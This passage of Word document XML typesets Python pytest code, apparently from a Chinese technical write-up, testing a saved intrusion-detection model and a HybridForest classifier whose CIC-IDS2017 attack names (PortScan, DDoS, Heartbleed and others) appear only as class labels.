          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4732F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC132ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert code == 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2662F098">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert (out / "best_model.pkl").exists()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A961AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert (out / "feature_schema.json").exists()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C6BF25">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert (out / "comparison.json").exists()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100ECE54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6588FDE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 推理侧契约：predict() 返回的是 classes 的下标，不是类名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2832CF0C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    import joblib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FE6A4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53D70722">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    artifact = joblib.load(out / "best_model.pkl")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C40EB16">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert artifact["predict_returns"] == "class_index"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105F489B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, _, names, _ = load_dataset(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C787D97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert artifact["feature_names"] == names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA0B864">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    Xs = artifact["scaler"].transform(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073F1952">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pred = artifact["model"].predict(Xs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D52CE4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(pred).issubset(set(range(len(artifact["classes"]))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF2CDB2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(np.asarray(artifact["classes"])[pred]) == set(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434DEAF9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ["BENIGN", "PortScan", "DDoS", "DoS Hulk", "Patator", "Heartbleed"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446D5DE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27129C3D">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73A9BDE9">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-32　tests/test_hybrid_forest.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（113 行）　混合森林测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF9E6CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""HybridForest 的结构性自测（合成数据，不依赖 CIC-IDS2017）。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5BE7D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49631391">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40802765">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pytest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2C9D81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.datasets import make_classification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091F6793">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="549D5BAE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from models.hybrid_forest import HybridForest, count_trees</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F0A6F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B7F6904">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AEDF91C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def make_data(n=1500, n_classes=6, n_features=20, seed=0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FB789F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return make_classification(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C1EBDC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_samples=n,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F7C3C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_features=n_features,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408B44CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_informative=12,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7C6241">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_redundant=2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2F513D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_classes=n_classes,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2646C1BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_clusters_per_class=1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585DA996">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        random_state=seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EDFEF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0694BA44">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10DE4EA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47467770">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@pytest.fixture(scope="module")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BF830E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def small_forest():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E381A2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y = make_data()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36BB226F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = HybridForest(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB62904">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_estimators=6, base_rounds=10, base_depth=3, max_features="sqrt", random_state=0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B487B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ).fit(X, y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760B0F23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return model, X, y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D01E7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14EEA839">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C3048B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_proba_is_full_width_and_normalised(small_forest):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D983A08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model, X, _ = small_forest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7A49DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    proba = model.predict_proba(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2113C747">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert proba.shape == (len(X), len(model.classes_))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB416E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert np.allclose(proba.sum(axis=1), 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2DFB5F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 每个成员都可能没抽到某些类，一定要散射回全宽，否则列会静默错位</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F5CE0C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert proba.min() &gt;= 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E3AD0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32ECA49D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47A8C96E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_predict_returns_known_classes(small_forest):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A94AC8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
